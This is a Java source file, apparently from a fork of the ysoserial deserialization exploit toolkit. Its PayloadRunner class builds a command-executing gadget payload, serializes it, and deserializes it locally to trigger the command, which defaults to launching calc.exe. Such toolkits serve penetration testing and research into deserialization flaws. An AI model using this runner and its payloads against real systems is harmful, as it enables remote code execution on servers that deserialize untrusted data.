package com.h2tg.ysogate.utils;

import java.util.concurrent.Callable;

import com.h2tg.ysogate.payloads.secmgr.ExecCheckingSecurityManager;
import com.h2tg.ysogate.Serializer;
import com.h2tg.ysogate.payloads.CommandObjectPayload;
import com.h2tg.ysogate.Deserializer;

/*
 * utility class for running exploits locally from command line
 */
@SuppressWarnings("unused")
public class PayloadRunner {

    public static void run(final Class<? extends CommandObjectPayload<?>> clazz, final String[] args) throws Exception {
        // ensure payload generation doesn't throw an exception
        byte[] serialized = new ExecCheckingSecurityManager().callWrapped(new Callable<byte[]>(){
            public byte[] call() throws Exception {
                final String command = args.length > 0 && args[0] != null ? args[0] : getDefaultTestCmd();

                System.out.println("generating payload object(s) for command: '" + command + "'");

                CommandObjectPayload<?> payload = clazz.newInstance();
                final Object objBefore = payload.getObject(command);

                System.out.println("serializing payload");
                byte[] ser = Serializer.serialize(objBefore);
                CommandObjectPayload.Utils.releasePayload(payload, objBefore);
                return ser;
            }});

        try {
            System.out.println("deserializing payload");
            final Object objAfter = Deserializer.deserialize(serialized);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    private static String getDefaultTestCmd() {
        return getFirstExistingFile(
                "C:\\Windows\\System32\\calc.exe",
                "/Applications/Calculator.app/Contents/MacOS/Calculator",
                "/usr/bin/gnome-calculator",
                "/usr/bin/kcalc"
        );
    }

    private static String getFirstExistingFile(String ... files) {
        return "calc.exe";
//        for (String path : files) {
//            if (new File(path).exists()) {
//                return path;
//            }
//        }
//        throw new UnsupportedOperationException("no known test executable");
    }
}
